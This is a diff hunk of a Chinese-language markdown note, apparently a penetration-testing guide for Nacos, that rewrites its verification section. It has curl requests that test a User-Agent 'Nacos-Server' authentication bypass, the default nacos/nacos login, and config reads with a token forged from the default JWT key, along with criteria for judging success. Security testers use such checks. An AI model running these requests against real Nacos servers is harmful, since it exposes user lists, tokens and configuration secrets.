@@ -93,23 +93,23 @@ curl -s "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&
 ## 验证方法
 
 ```bash
-# 验证User-Agent绕过是否有效
-curl -s -o /dev/null -w "%{http_code}" \
-  "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" \
+# 验证User-Agent绕过：响应体是用户分页 JSON，含 totalCount、pageNumber、pageItems
+curl -s "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" \
   -H "User-Agent: Nacos-Server"
-# 返回200表示绕过成功，403表示已修复
+# 判据：pageItems 数组里出现 username / roles 字段（如 username":"nacos）
+# 反例：403 且响应体为 {"status":403,"message":"user not found!"}，或返回 Nacos 登录页 HTML
 
-# 验证默认凭据
-curl -s -o /dev/null -w "%{http_code}" \
-  "http://target:8848/nacos/v1/auth/login" \
+# 验证默认凭据：登录响应 JSON 的 accessToken 是非空长串
+curl -s "http://target:8848/nacos/v1/auth/login" \
   -X POST -d "username=nacos&password=nacos"
-# 返回200并包含accessToken表示默认凭据有效
+# 判据：响应含 "accessToken":"eyJ..." 且 tokenTtl 有具体值
+# 反例：返回登录页 HTML，或 {"status":403,"message":"unknown user!"}
 
-# 验证默认JWT密钥
-curl -s -o /dev/null -w "%{http_code}" \
-  "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=1&search=accurate" \
+# 验证默认JWT密钥：用默认密钥伪造的 token 能读到配置
+curl -s "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=1&search=accurate" \
   -H "Authorization: Bearer $TOKEN"
-# 返回200表示默认密钥未更换
+# 判据：响应体是配置分页 JSON，含 totalCount / pageItems，pageItems 元素带 dataId、group、content
+# 反例：403 且响应体为 {"status":403,"message":"user not found!"} → 密钥已更换
 ```
 
 ## 指纹确认
